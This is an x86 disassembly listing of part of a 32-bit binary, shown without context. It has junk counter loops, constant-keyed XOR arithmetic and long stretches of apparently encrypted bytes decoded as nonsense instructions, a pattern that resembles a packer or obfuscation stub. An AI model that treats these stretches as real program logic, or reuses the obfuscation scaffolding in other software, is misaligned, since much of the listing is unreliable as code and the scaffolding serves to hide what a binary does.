  40a548:	mov    esi,0x7510855
  40a54d:	and    DWORD PTR ds:0x432dca,0x0
  40a557:	mov    ebx,DWORD PTR ds:0x432dca
  40a55d:	inc    ebx
  40a55e:	mov    DWORD PTR ds:0x432dca,ebx
  40a564:	cmp    DWORD PTR ds:0x432dca,0x2c
  40a56b:	jne    0x40a57a
  40a571:	push   DWORD PTR [ebp-0xc]
  40a574:	call   DWORD PTR ds:0x432c5a
  40a57a:	cmp    DWORD PTR ds:0x432dca,0x1e
  40a581:	jb     0x40a557
  40a587:	xor    eax,esi
  40a589:	and    DWORD PTR ds:0x4343a2,0x0
  40a593:	jmp    0x40a5a5
  40a598:	mov    ebx,DWORD PTR ds:0x4343a2
  40a59e:	inc    ebx
  40a59f:	mov    DWORD PTR ds:0x4343a2,ebx
  40a5a5:	cmp    DWORD PTR ds:0x4343a2,0x1a
  40a5ac:	jae    0x40a78c
  40a5b2:	cmp    DWORD PTR ds:0x4343a2,0x1d
  40a5b9:	jne    0x40a5cf
  40a5bf:	push   0x74a9
  40a5c4:	push   0x3c30
  40a5c9:	call   DWORD PTR ds:0x432c5e
  40a5cf:	jmp    0x40a598
  40a5d4:	jmp    0x40a78c
  40a5d9:	cmp    dh,BYTE PTR [esi+0x69734bd3]
  40a5df:	inc    edx
  40a5e0:	mov    ch,0x74
  40a5e2:	neg    DWORD PTR [ebx-0x6]
  40a5e5:	dec    ebp
  40a5e6:	jecxz  0x40a575
  40a5e8:	or     al,0xd2
  40a5ea:	loopne 0x40a65c
  40a5ec:	jo     0x40a583
  40a5ee:	jg     0x40a660
  40a5f0:	jo     0x40a664
  40a5f2:	mov    bl,0xac
  40a5f4:	mov    dh,0xcf
  40a5f6:	inc    eax
  40a5f7:	jle    0x40a5aa
  40a5f9:	cld    
  40a5fa:	push   edx
  40a5fb:	and    BYTE PTR [ecx+0x6e],dh
  40a5fe:	loopne 0x40a5cc
  40a600:	jp     0x40a5d6
  40a602:	jbe    0x40a596
  40a604:	pop    esi
  40a605:	mov    bh,0x41
  40a607:	scas   eax,DWORD PTR es:[edi]
  40a608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a609:	add    esp,0x7147b05e
  40a60f:	xor    DWORD PTR [edi],edi
  40a611:	dec    ebp
  40a612:	pop    edi
  40a613:	inc    ebp
  40a614:	in     eax,dx
  40a615:	adc    DWORD PTR [esi],edi
  40a617:	in     al,dx
  40a618:	scas   eax,DWORD PTR es:[edi]
  40a619:	sti    
  40a61a:	inc    ecx
  40a61b:	(bad)  
  40a61c:	repnz shl dl,1
  40a61f:	push   ds
  40a620:	(bad)  
  40a621:	jg     0x40a5b7
  40a623:	or     eax,0x541d4b7a
  40a628:	push   esi
  40a629:	mov    ds:0x71716a8e,eax
  40a62e:	add    DWORD PTR [ebx-0x27],esi
  40a631:	out    0x73,eax
  40a633:	cwde   
  40a634:	jge    0x40a605
  40a636:	pop    ds
  40a637:	xchg   BYTE PTR [edi],bl
  40a639:	sbb    BYTE PTR [ebx],0xb6
  40a63c:	popf   
  40a63d:	adc    esp,DWORD PTR [ebx+0x6c94f88e]
  40a643:	lock or al,0x6c
  40a646:	jbe    0x40a616
  40a648:	data16 aaa 
  40a64a:	add    BYTE PTR [edi],bh
  40a64c:	push   ds
  40a64d:	jmp    0x40a6ad
  40a64f:	cmc    
  40a650:	in     al,0xb3
  40a652:	lahf   
  40a653:	inc    edi
  40a654:	outs   dx,DWORD PTR ds:[esi]
  40a655:	shl    DWORD PTR [edx-0x6ab9ea9f],1
  40a65b:	jg     0x40a669
  40a65d:	test   ah,dh
  40a65f:	pop    esp
  40a660:	pop    esp
  40a661:	pusha  
  40a662:	jmp    0x8da:0x43711b59
  40a669:	or     al,0x85
  40a66b:	jecxz  0x40a6a9
  40a66d:	call   0x7b51:0x62d07895
  40a674:	pop    esp
  40a675:	jge    0x40a68d
  40a677:	jae    0x40a69b
  40a679:	(bad)  
  40a67a:	sub    cl,dh
  40a67c:	sbb    al,0xa5
  40a67e:	les    esp,FWORD PTR [edi-0x16912042]
  40a684:	adc    BYTE PTR [esi],0x15
  40a687:	in     eax,dx
  40a688:	jmp    0x40a643
  40a68a:	rcl    DWORD PTR [edx],0x5b
  40a68d:	xor    eax,0x590676c
  40a692:	cli    
  40a693:	loope  0x40a6a1
  40a695:	call   DWORD PTR [ebx]
  40a697:	add    dl,al
  40a699:	pop    edx
  40a69a:	mov    ds:0xae53577d,eax
  40a69f:	icebp  
  40a6a0:	stos   DWORD PTR es:[edi],eax
  40a6a1:	pop    es
  40a6a2:	repnz test eax,0x57d6223c
  40a6a8:	xchg   esp,eax
  40a6a9:	in     eax,dx
  40a6aa:	push   edx
  40a6ab:	sbb    DWORD PTR [ecx+0x223a9a6],esp
  40a6b1:	jle    0x40a687
  40a6b3:	sbb    ah,BYTE PTR [eax+0x2a]
  40a6b6:	(bad)  
  40a6b7:	dec    esi
  40a6b8:	das    
  40a6b9:	aaa    
  40a6ba:	test   BYTE PTR [edi],ah
  40a6bc:	mov    ebx,gs
  40a6be:	shr    ch,cl
  40a6c0:	sbb    al,BYTE PTR [ebx+0x28f7e8e4]
  40a6c6:	cmp    eax,0xf1bde9c4
  40a6cb:	shl    BYTE PTR [ebx],cl
  40a6cd:	out    dx,al
  40a6ce:	cmp    bh,0x68
  40a6d1:	jnp    0x40a6b4
  40a6d3:	and    DWORD PTR [ebp-0x20],edi
  40a6d6:	add    ah,bh
  40a6d8:	repz in al,dx
  40a6da:	jp     0x40a743
  40a6dc:	jb     0x40a6f8
  40a6de:	sub    edx,DWORD PTR [edi-0x783327c0]
  40a6e4:	sbb    DWORD PTR [ebx+ecx*2-0x2da5bd5a],0x242fa1b0
  40a6ef:	ins    BYTE PTR es:[edi],dx
  40a6f0:	jge    0x40a6ec
  40a6f2:	jle    0x40a682
  40a6f4:	test   al,0x4f
  40a6f6:	shl    BYTE PTR [ebx+0xc],0x15
  40a6fa:	enter  0xdba2,0x81
  40a6fe:	sahf   
  40a6ff:	sbb    BYTE PTR [eax],0x7
  40a702:	loop   0x40a6e0
  40a704:	in     eax,0xc0
  40a706:	push   cs
  40a707:	jne    0x40a6fa
  40a709:	xchg   ebx,eax
  40a70a:	(bad)  
  40a70b:	adc    eax,0xf90ab1fd
  40a710:	ins    DWORD PTR es:[edi],dx
  40a711:	dec    esi
  40a712:	mov    edi,0xcb8080aa
  40a717:	and    DWORD PTR [ebp-0x4c5c8833],ebx
  40a71d:	aad    0xcd
  40a71f:	mov    al,0x44
  40a721:	jbe    0x40a743
  40a723:	jbe    0x40a70f
  40a725:	int3   
  40a726:	mov    bl,0x70
  40a728:	outs   dx,DWORD PTR ds:[esi]
  40a729:	jl     0x40a6f5
  40a72b:	sbb    ch,al
  40a72d:	xor    al,0x7f
  40a72f:	or     dh,ah
  40a731:	inc    eax
  40a732:	pop    ds
  40a733:	push   ds
  40a734:	popa   
  40a735:	pusha  
  40a736:	(bad)  
  40a738:	add    cl,BYTE PTR [esi+ebx*8]
  40a73b:	push   esi
  40a73c:	lods   eax,DWORD PTR ds:[esi]
  40a73d:	cmp    dl,BYTE PTR [ecx+0x47]
  40a740:	jmp    0x2230bc4c
  40a745:	outs   dx,BYTE PTR ds:[esi]
  40a746:	aad    0xb6
  40a748:	mov    ds:0x2b8b6c8b,eax
  40a74d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a74f:	mov    eax,edi
  40a751:	push   ecx
  40a752:	mov    dh,0x6
  40a754:	push   ss
  40a755:	aam    0x5b
  40a757:	mov    es,esi
  40a759:	sub    dh,BYTE PTR [edx-0x77]
  40a75c:	mov    edx,0x5de6e432
  40a761:	stos   BYTE PTR es:[edi],al
  40a762:	xor    cl,BYTE PTR [edx-0x3fe07957]
  40a768:	test   DWORD PTR [ebp-0x5e],edi
  40a76b:	(bad)  
  40a76c:	push   0x9946db90
  40a771:	test   BYTE PTR [ebp-0x4a539cde],0xd8
  40a778:	(bad)  
  40a779:	out    dx,eax
  40a77a:	jecxz  0x40a7e1
  40a77c:	iret   
  40a77d:	scas   eax,DWORD PTR es:[edi]
  40a77e:	int    0xbf
  40a780:	mov    esp,0xc2e3ba5e
  40a785:	inc    ebp
  40a786:	sbb    eax,0x19b43830
  40a78b:	fist   WORD PTR [edi-0x17]
  40a78e:	mov    bl,0x1
  40a790:	add    BYTE PTR [eax],al
  40a792:	mov    ah,0x79
  40a794:	jae    0x40a807
  40a796:	jno    0x40a809
  40a798:	mov    dl,0x39
  40a79a:	hlt    
  40a79b:	or     ebp,DWORD PTR [edx+ebp*2+0x15]
  40a79f:	mov    dl,0x8d
  40a7a1:	out    dx,eax
  40a7a2:	ja     0x40a793
  40a7a4:	jo     0x40a816
  40a7a6:	xchg   ebp,eax
  40a7a7:	jg     0x40a819
  40a7a9:	jo     0x40a77c
  40a7ab:	mov    al,0xd1
  40a7ad:	mov    esp,0x7d11967b
  40a7b2:	in     eax,dx
  40a7b3:	jge    0x40a7cb
  40a7b5:	cmp    esi,0xffffffbb
  40a7b8:	and    eax,0xf709925d
  40a7bd:	or     eax,0xf50d50be
  40a7c2:	hlt    
  40a7c3:	mov    DWORD PTR [esi-0x36db7d6f],edx
  40a7c9:	add    esp,esi
  40a7cb:	retf   
  40a7cc:	aam    0x42
  40a7ce:	xchg   edi,eax
  40a7cf:	xor    al,0x85
  40a7d1:	add    al,0x6b
  40a7d3:	jg     0x40a823
  40a7d5:	mov    al,0x3b
  40a7d7:	arpl   WORD PTR [esi+0x934c81d],si
  40a7dd:	inc    eax
  40a7de:	jno    0x40a846
  40a7e0:	pop    edi
  40a7e1:	sbb    BYTE PTR ss:[ecx+0x779d7fe3],al
  40a7e8:	pop    edi
  40a7e9:	sbb    esp,edx
  40a7eb:	pop    ecx
  40a7ec:	push   ecx
  40a7ed:	vpinsrw xmm4,xmm6,WORD PTR [eax-0x2e],0x83
  40a7f3:	adc    ah,ah
  40a7f5:	shl    BYTE PTR [ecx+0x3e22dc9d],1
  40a7fb:	aas    
  40a7fc:	pmulhw mm1,mm4
  40a7ff:	pop    edi
  40a800:	push   ds
  40a801:	movlps xmm3,QWORD PTR [edx]
  40a804:	repz adc eax,0x483a037f
  40a80a:	sbb    DWORD PTR [eax+ebp*8],esp
  40a80d:	xor    ch,BYTE PTR [ecx-0x124de3c5]
  40a813:	mov    edx,0xd1a9d5f0
  40a818:	push   ecx
  40a819:	cmp    eax,0xaad63fd9
  40a81e:	add    DWORD PTR [ebp+0x6e54118c],esi
  40a824:	inc    ebx
  40a825:	add    DWORD PTR [esi+0x4a],0xaa96ec6d
  40a82c:	pop    edx
  40a82d:	jmp    0x40a824
  40a82f:	xchg   ebp,eax
  40a830:	imul   esp,DWORD PTR [edx+0xe4d54bc],0x62e0f0ec
  40a83a:	shr    esp,cl
  40a83c:	cmc    
  40a83d:	stc    
  40a83e:	push   0xffffff80
  40a840:	(bad)  
  40a841:	imul   edi,DWORD PTR [eax+ecx*1+0x32],0x5e02dc6f
  40a849:	mov    ch,0x5f
  40a84b:	push   eax
  40a84c:	push   0x3e
  40a84e:	mov    ecx,0x88c7501e
  40a853:	jbe    0x40a801
  40a855:	pop    esp
  40a856:	cld    
  40a857:	or     eax,0x3acfb8b3
  40a85c:	rcr    BYTE PTR [edi+0x52d8124e],cl
  40a862:	rol    BYTE PTR [ebx+0x25beaae],1
  40a868:	mov    WORD PTR [ecx+0x37],cs
  40a86b:	cmp    edi,DWORD PTR [esi]
  40a86d:	popa   
  40a86e:	and    eax,0x7c7006e1
  40a873:	and    esp,ebp
  40a875:	push   eax
  40a876:	lock and ebx,esp
  40a879:	mov    edi,0xccb06786
  40a87e:	nop
  40a87f:	outs   dx,DWORD PTR ds:[esi]
  40a880:	adc    BYTE PTR [ebx],dl
  40a882:	xor    ecx,DWORD PTR [esi-0x6c0af276]
  40a888:	pop    edx
  40a889:	setnp  BYTE PTR [eax+0x40]
  40a88d:	in     al,0x6a
  40a88f:	gs ds jge 0x40a826
  40a893:	push   ds
  40a894:	or     al,0x84
  40a896:	xor    al,0x4
  40a898:	xchg   edi,eax
  40a899:	mov    ds:0x9a61f5c4,eax
  40a89e:	cs and al,0xee
  40a8a1:	sbb    ch,BYTE PTR [edi]
  40a8a3:	jg     0x40a837
  40a8a5:	cmp    eax,0x95cb8366
  40a8aa:	push   0xffffffad
  40a8ac:	daa    
  40a8ad:	pop    edx
  40a8ae:	mov    eax,0xe0c077be
  40a8b3:	cmp    DWORD PTR [edi],eax
  40a8b5:	(bad)  
  40a8b6:	pusha  
  40a8b7:	push   0x13061b
  40a8bc:	jecxz  0x40a8cc
  40a8be:	aam    0x42
  40a8c0:	mov    ds:0xeede5efa,al
  40a8c5:	call   FWORD PTR [ebp-0x5]
  40a8c8:	sub    dl,BYTE PTR ds:0xd9b1cb2
  40a8ce:	add    BYTE PTR [ecx-0x50eac904],0x85
  40a8d5:	outs   dx,DWORD PTR ds:[esi]
  40a8d6:	data16 in al,0x43
  40a8d9:	cmc    
  40a8da:	pop    esp
  40a8db:	jo     0x40a86a
  40a8dd:	fld    DWORD PTR [eax-0x2e]
  40a8e0:	dec    ebx
  40a8e1:	aas    
  40a8e2:	adc    esp,DWORD PTR [ebx-0x78]
  40a8e5:	pusha  
  40a8e6:	shl    BYTE PTR [esi-0x7e83cfe],1
  40a8ec:	mov    bh,0x38
  40a8ee:	outs   dx,DWORD PTR ds:[esi]
  40a8ef:	ins    BYTE PTR es:[edi],dx
  40a8f0:	mov    cl,0x63
  40a8f2:	stc    
  40a8f3:	shl    BYTE PTR [ecx],cl
  40a8f5:	popf   
  40a8f6:	icebp  
  40a8f7:	in     al,0xae
  40a8f9:	stc    
  40a8fa:	mov    eax,ds:0xee2eb2c6
  40a8ff:	stc    
  40a900:	aas    
  40a901:	or     eax,0x5c0e04a8
  40a906:	mov    ah,0x6b
  40a908:	mov    dh,0x9f
  40a90a:	cwde   
  40a90b:	fstp   TBYTE PTR [edi+0x67]
  40a90e:	mov    ch,0x52
  40a910:	shl    BYTE PTR [esi-0x67ddb1c3],0x53
  40a917:	nop
  40a918:	sub    BYTE PTR [edx-0x7b6c6119],ah
  40a91e:	std    
  40a91f:	mov    esp,0xd797a415
  40a924:	aam    0x3d
  40a926:	jae    0x40a946
  40a928:	and    eax,0x8734964
  40a92d:	fcmovnbe st,st(2)
  40a92f:	bound  ebp,QWORD PTR [esi]
  40a931:	imul   esp,ebp,0x68
  40a934:	push   edx
  40a935:	xchg   ebp,eax
  40a936:	dec    edi
  40a937:	and    al,bl
  40a939:	outs   dx,BYTE PTR ds:[esi]
  40a93a:	loope  0x40a942
  40a93c:	stc    
  40a93d:	dec    edi
  40a93e:	dec    esi
  40a93f:	pop    ebp
  40a940:	stos   DWORD PTR es:[edi],eax
  40a941:	xor    DWORD PTR [ebx],ebx
  40a943:	jg     0x40a958
  40a945:	mov    edi,0x32729c
  40a94a:	adc    ebx,DWORD PTR ds:0x432708
  40a950:	add    eax,edi
  40a952:	sbb    DWORD PTR ds:0x432de2,edi
  40a958:	mov    DWORD PTR [ecx],eax
  40a95a:	not    DWORD PTR ds:0x434421
  40a960:	lea    eax,[ebp-0x4]
  40a963:	xor    DWORD PTR ds:0x432de2,ecx
  40a969:	mov    DWORD PTR [ebp-0x10],eax
  40a96c:	mov    eax,DWORD PTR [ebp+0x8]
  40a96f:	add    DWORD PTR ds:0x432dca,edx
  40a975:	mov    ecx,DWORD PTR [ebp-0x10]
  40a978:	xor    eax,esi
  40a97a:	and    DWORD PTR ds:0x4326fc,0x0
  40a984:	jmp    0x40a996
  40a989:	mov    ebx,DWORD PTR ds:0x4326fc
  40a98f:	inc    ebx
  40a990:	mov    DWORD PTR ds:0x4326fc,ebx
  40a996:	cmp    DWORD PTR ds:0x4326fc,0x1a
  40a99d:	jae    0x40a9da
  40a9a3:	cmp    DWORD PTR ds:0x4326fc,0x8
  40a9aa:	jne    0x40a9bb
  40a9b0:	push   0x184e
  40a9b5:	call   DWORD PTR ds:0x432d12
  40a9bb:	cmp    DWORD PTR ds:0x4326fc,0x7
  40a9c2:	jne    0x40a9d5
  40a9c8:	mov    ebx,DWORD PTR ds:0x4326fc
  40a9ce:	inc    ebx
  40a9cf:	mov    DWORD PTR ds:0x4326fc,ebx
  40a9d5:	jmp    0x40a989
  40a9da:	add    eax,edi
  40a9dc:	mov    DWORD PTR [ecx],eax
  40a9de:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a9e5:	lea    eax,[ebp-0x18]
  40a9e8:	and    DWORD PTR ds:0x4326f8,0x0
  40a9f2:	jmp    0x40aa04
  40a9f7:	mov    ecx,DWORD PTR ds:0x4326f8
  40a9fd:	inc    ecx
  40a9fe:	mov    DWORD PTR ds:0x4326f8,ecx
  40aa04:	cmp    DWORD PTR ds:0x4326f8,0x16
  40aa0b:	jae    0x40aa5e
  40aa11:	cmp    DWORD PTR ds:0x4326f8,0x4
  40aa18:	jne    0x40aa39
  40aa1e:	push   0x5697
  40aa23:	push   DWORD PTR [ebp-0xc]
  40aa26:	push   0x541e
  40aa2b:	push   0x8aca
  40aa30:	push   DWORD PTR [ebp-0x24]
  40aa33:	call   DWORD PTR ds:0x432c62
  40aa39:	cmp    DWORD PTR ds:0x4326f8,0x3
  40aa40:	jne    0x40aa53
  40aa46:	mov    ecx,DWORD PTR ds:0x4326f8
  40aa4c:	inc    ecx
  40aa4d:	mov    DWORD PTR ds:0x4326f8,ecx
  40aa53:	jmp    0x40a9f7
  40aa58:	and    DWORD PTR ds:0x434376,ecx
  40aa5e:	mov    DWORD PTR [ebp-0x24],eax
  40aa61:	and    DWORD PTR ds:0x43437e,0x0
  40aa6b:	jmp    0x40aa7f
  40aa70:	xor    ecx,ecx
  40aa72:	add    ecx,DWORD PTR ds:0x43437e
  40aa78:	inc    ecx
  40aa79:	mov    DWORD PTR ds:0x43437e,ecx
  40aa7f:	cmp    DWORD PTR ds:0x43437e,0x18
  40aa86:	jae    0x40aab3
  40aa8c:	cmp    DWORD PTR ds:0x43437e,0x20
  40aa93:	jne    0x40aaae
  40aa99:	push   0x6696
  40aa9e:	push   0x74e3
  40aaa3:	push   0x43275d
  40aaa8:	call   DWORD PTR ds:0x432d16
  40aaae:	jmp    0x40aa70
  40aab3:	mov    eax,DWORD PTR [ebp-0x18]
  40aab6:	add    DWORD PTR ds:0x43436e,0x336
  40aac0:	mov    ecx,DWORD PTR [ebp-0x24]
  40aac3:	sub    DWORD PTR ds:0x4343a2,ebx
  40aac9:	xor    eax,esi
  40aacb:	add    DWORD PTR ds:0x432dc6,ebx
  40aad1:	add    eax,edi
  40aad3:	neg    ebx
  40aad5:	mov    DWORD PTR [ecx],eax
  40aad7:	mov    eax,ds:0x416274
  40aadc:	movzx  ebx,WORD PTR ds:0x434392
  40aae3:	sbb    DWORD PTR ds:0x4326ec,ebx
  40aae9:	mov    ebx,0x8e12febe
  40aaee:	mov    DWORD PTR ds:0x434419,0x7eb1
  40aaf8:	mov    DWORD PTR [ebp-0xc],ebx
  40aafb:	mov    eax,DWORD PTR [eax]
  40aafd:	or     DWORD PTR ds:0x432de2,0x3ff6
  40ab07:	mov    cx,WORD PTR [ebp-0x4]
  40ab0b:	add    DWORD PTR ds:0x434392,0x7366
  40ab15:	movzx  ecx,cx
  40ab18:	add    ecx,DWORD PTR [eax]
  40ab1a:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40ab21:	mov    DWORD PTR [ebp-0x1c],ecx
  40ab24:	jmp    0x40acdc
  40ab29:	jbe    0x40ab3f
  40ab2b:	dec    eax
  40ab2c:	sahf   
  40ab2d:	jb     0x40ab89
  40ab2f:	jbe    0x40ab05
  40ab31:	xor    eax,0x447cbad5
  40ab36:	std    
  40ab37:	std    
  40ab38:	xchg   ecx,eax
  40ab39:	mov    ebp,gs
  40ab3b:	jo     0x40abad
  40ab3d:	xchg   ebp,eax
  40ab3e:	jg     0x40abb0
  40ab40:	jo     0x40ab09
  40ab42:	xchg   esp,eax
  40ab43:	jg     0x40aae2
  40ab45:	cdq    
  40ab46:	sar    BYTE PTR [eax+0x6b],0x2a
  40ab4a:	push   0x60408a9a
  40ab4f:	inc    eax
  40ab50:	or     eax,0x6cdb585f
  40ab55:	fwait
  40ab56:	test   eax,0xc2e97ad8
  40ab5b:	cld    
  40ab5c:	cmp    eax,0x804e23f4
  40ab61:	xchg   DWORD PTR [ebx-0x4faac3a2],edx
  40ab67:	push   esp
  40ab68:	in     eax,dx
  40ab69:	(bad)  [ebx]
  40ab6b:	push   ss
  40ab6c:	int    0x6f
  40ab6e:	jo     0x40ab20
  40ab70:	xor    al,0x37
  40ab72:	repnz repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab75:	mov    es,WORD PTR [ebx]
  40ab77:	xlat   BYTE PTR ds:[ebx]
  40ab78:	stc    
  40ab79:	aam    0xb9
  40ab7b:	dec    ebx
  40ab7c:	add    edx,DWORD PTR [ecx+0x69]
  40ab7f:	mov    eax,0x3e400796
  40ab84:	sbb    al,0xb0
  40ab86:	push   ecx
  40ab87:	lds    ebx,FWORD PTR [ecx-0x38]
  40ab8a:	mov    WORD PTR [edx],es
  40ab8c:	mov    bh,0x80
  40ab8e:	push   0x4c
  40ab90:	pop    ebp
  40ab91:	push   eax
  40ab92:	popf   
  40ab93:	jmp    0x7faf15e3
  40ab98:	int    0x6c
  40ab9a:	vmovss xmm2,xmm5,xmm1
  40ab9e:	test   al,0x47
  40aba0:	test   dl,0x2f
  40aba3:	push   cs
  40aba4:	jns    0x40ac1a
  40aba6:	fdivr  st,st(4)
  40aba8:	ja     0x40ab74
  40abaa:	adc    bh,dh
  40abac:	jmp    0x8463:0x88b33ddc
  40abb3:	push   ebx
  40abb4:	sub    edx,DWORD PTR [edi]
  40abb6:	not    ah
  40abb8:	aaa    
  40abb9:	xor    DWORD PTR [edi-0x10387108],edi
  40abbf:	add    ah,BYTE PTR [ebp+0x6cacc9ba]
  40abc5:	and    eax,0xd7454a0f
  40abca:	cmc    
  40abcb:	ins    BYTE PTR es:[edi],dx
  40abcc:	mov    eax,ds:0x591d547
  40abd1:	into   
  40abd2:	xchg   ebp,eax
  40abd3:	jnp    0x40ac1d
  40abd5:	fld    QWORD PTR [ebx+0x2e]
  40abd8:	xor    al,0x22
  40abda:	ja     0x40abfa
  40abdc:	push   ss
  40abdd:	cmp    DWORD PTR [ebx-0x20],edx
  40abe0:	jg     0x40abb7
  40abe2:	scas   eax,DWORD PTR es:[edi]
  40abe3:	mov    ebx,0x2078903a
  40abe8:	mov    eax,0x8ac1e2d6
  40abed:	inc    ecx
  40abee:	loope  0x40ac6b
  40abf0:	pop    edx
  40abf1:	dec    ebx
  40abf2:	ret    
  40abf3:	push   esi
  40abf4:	mov    edx,0xcccd7d22
  40abf9:	sbb    esp,DWORD PTR [ecx-0x2705a9eb]
  40abff:	xchg   esi,eax
  40ac00:	in     eax,dx
  40ac01:	test   edx,edi
  40ac03:	fmul   st,st(7)
  40ac05:	dec    esp
  40ac06:	inc    ebp
  40ac07:	adc    BYTE PTR [edi+edi*4],ah
  40ac0a:	scas   al,BYTE PTR es:[edi]
  40ac0b:	add    BYTE PTR [eax-0x76f1b9fa],dl
  40ac11:	dec    edi
  40ac12:	(bad)  
  40ac13:	adc    esp,DWORD PTR [eax]
  40ac15:	jbe    0x40abc2
  40ac17:	ret    
  40ac18:	ror    DWORD PTR [ecx+0x5c897058],0x1b
  40ac1f:	add    bl,al
  40ac21:	sub    ebx,esp
  40ac23:	cwde   
  40ac24:	add    edi,DWORD PTR [edx+0x69]
  40ac27:	push   ss
  40ac28:	mov    eax,0x5127698
  40ac2d:	xor    esp,DWORD PTR [edi+esi*2]
  40ac30:	iret   
  40ac31:	outs   dx,BYTE PTR fs:[esi]
  40ac33:	pop    ss
  40ac34:	cmp    DWORD PTR [edi-0x60],edi
  40ac37:	gs push es
  40ac39:	xchg   ecx,eax
  40ac3a:	aas    
  40ac3b:	adc    BYTE PTR [ecx+0x7f],ch
  40ac3e:	out    0x6d,eax
  40ac40:	mov    ebx,0xbe5a15fa
  40ac45:	mov    bl,0xb5
  40ac47:	push   eax
  40ac48:	inc    edx
  40ac49:	ja     0x40ac1d
  40ac4b:	cmp    al,0x79
  40ac4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac4e:	add    ebx,esi
  40ac50:	fmul   QWORD PTR [ebx]
  40ac52:	pop    esp
  40ac53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac54:	pop    ss
  40ac55:	or     al,0xf1
  40ac57:	idiv   BYTE PTR [edi-0x401c036c]
  40ac5d:	push   0x86ebf34f
  40ac62:	xchg   ebp,eax
  40ac63:	xchg   esp,eax
  40ac64:	mov    esi,0xa50b801d
  40ac69:	arpl   WORD PTR [edx],sp
  40ac6b:	adc    ah,ah
  40ac6d:	and    BYTE PTR [eax-0x69bdbafd],dl
  40ac73:	mov    al,ds:0x8f6e58d4
  40ac78:	xchg   ebx,eax
  40ac79:	and    esi,ecx
  40ac7b:	cmp    DWORD PTR [esi+0x43],edi
  40ac7e:	cdq    
  40ac7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac80:	out    dx,eax
  40ac81:	jl     0x40acba
  40ac83:	push   ds
  40ac84:	out    dx,eax
  40ac85:	jae    0x40accf
  40ac87:	jp     0x40ace8
  40ac89:	dec    esi
  40ac8a:	and    esp,0xffffff9d
  40ac8d:	mov    DWORD PTR [eax+0x575a4a09],edi
  40ac93:	jo     0x40ac96
  40ac95:	mov    ebx,0xbe1589e
  40ac9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac9b:	pushf  
  40ac9c:	or     al,0x2f
  40ac9e:	inc    eax
  40ac9f:	loopne 0x40ac57
  40aca1:	dec    DWORD PTR [ecx+0x678f8e6d]
  40aca7:	push   cs
  40aca8:	push   ebp
  40aca9:	loopne 0x40ac59
  40acab:	mov    ds,WORD PTR [ecx]
  40acad:	out    0xe9,al
  40acaf:	lds    eax,FWORD PTR [ecx+0x6d]
  40acb2:	xchg   ebp,eax
  40acb3:	jne    0x40ad33
  40acb5:	test   al,0x25
  40acb7:	(bad)  
  40acb8:	aam    0x16
  40acba:	les    esi,FWORD PTR [ebx+0x63e1fca4]
  40acc0:	and    ebx,ecx
  40acc2:	or     DWORD PTR [edi],ebx
  40acc4:	sbb    DWORD PTR [ecx+0x106a7048],eax
  40acca:	xchg   ebx,eax
  40accb:	imul   DWORD PTR [edx]
  40accd:	icebp  
  40acce:	test   esp,0xc26aabfb
  40acd4:	xor    al,0xd5
  40acd6:	sub    eax,DWORD PTR [edi]
  40acd8:	add    edi,0x458b1c28
  40acde:	or     BYTE PTR [ebx-0x39cc07b3],cl
  40ace4:	add    eax,edi
  40ace6:	cmp    DWORD PTR [ecx],eax
  40ace8:	jne    0x40af2d
  40acee:	mov    eax,DWORD PTR [ebp+0x8]
  40acf1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40acf4:	xor    eax,esi
  40acf6:	add    eax,edi
  40acf8:	cmp    DWORD PTR [ecx],eax
  40acfa:	jne    0x40ad1d
  40ad00:	mov    eax,DWORD PTR [ebp+0x8]
  40ad03:	mov    ecx,DWORD PTR [ebp-0x10]
  40ad06:	xor    eax,esi
  40ad08:	add    eax,edi
  40ad0a:	mov    DWORD PTR [ecx],eax
  40ad0c:	mov    eax,DWORD PTR [ebp-0x10]
  40ad0f:	mov    ecx,DWORD PTR [ebp-0x14]
  40ad12:	xor    ecx,esi
  40ad14:	mov    edx,0xffcd8d64
  40ad19:	sub    edx,ecx
  40ad1b:	add    DWORD PTR [eax],edx
  40ad1d:	mov    eax,ds:0x416274
  40ad22:	mov    eax,DWORD PTR [eax]
  40ad24:	mov    cx,WORD PTR [ebp-0x4]
  40ad28:	movzx  ecx,cx
  40ad2b:	add    ecx,DWORD PTR [eax]
  40ad2d:	mov    DWORD PTR [ebp-0x1c],ecx
  40ad30:	mov    eax,DWORD PTR [ebp+0xc]
  40ad33:	jmp    0x40aeeb
  40ad38:	and    ecx,ecx
  40ad3a:	repnz call 0x5305:0x5171a1f2
  40ad42:	inc    esi
  40ad43:	std    
  40ad44:	aas    
  40ad45:	hlt    
  40ad46:	mov    DWORD PTR ds:0x7070eb21,edx
  40ad4c:	xchg   ebp,eax
  40ad4d:	jg     0x40adbf
  40ad4f:	jo     0x40acd7
  40ad51:	and    al,0x9f
  40ad53:	in     eax,0x49
  40ad55:	aam    0xa
  40ad57:	div    BYTE PTR [esi]
  40ad59:	daa    
  40ad5a:	xor    bh,BYTE PTR [edx+0x5d]
  40ad5d:	test   DWORD PTR [edx+eiz*1],esi
  40ad60:	or     edi,DWORD PTR [ecx+edx*8-0x68cd64e2]
  40ad67:	sbb    esp,DWORD PTR [esi-0x6cc9786d]
  40ad6d:	add    dh,BYTE PTR [esi]
  40ad6f:	in     al,dx
  40ad70:	(bad)  
  40ad71:	dec    edi
  40ad72:	adc    al,0xf8
  40ad74:	mov    edx,DWORD PTR es:[bx+di+0x41]
  40ad79:	sbb    al,0xe
  40ad7b:	imul   esi,DWORD PTR [edx],0x978bd801
  40ad81:	(bad)  
  40ad82:	push   ebx
  40ad83:	outs   dx,BYTE PTR ds:[esi]
  40ad84:	int    0x13
  40ad86:	dec    esp
  40ad87:	and    al,0xe6
  40ad89:	sbb    edi,DWORD PTR [eax+0x7b53c317]
  40ad8f:	add    eax,0x52e3ad12
  40ad94:	push   ecx
  40ad95:	(bad)  
  40ad96:	pop    ebp
  40ad97:	xlat   BYTE PTR ds:[ebx]
  40ad98:	xchg   esi,eax
  40ad99:	sub    eax,0x98fa25d8
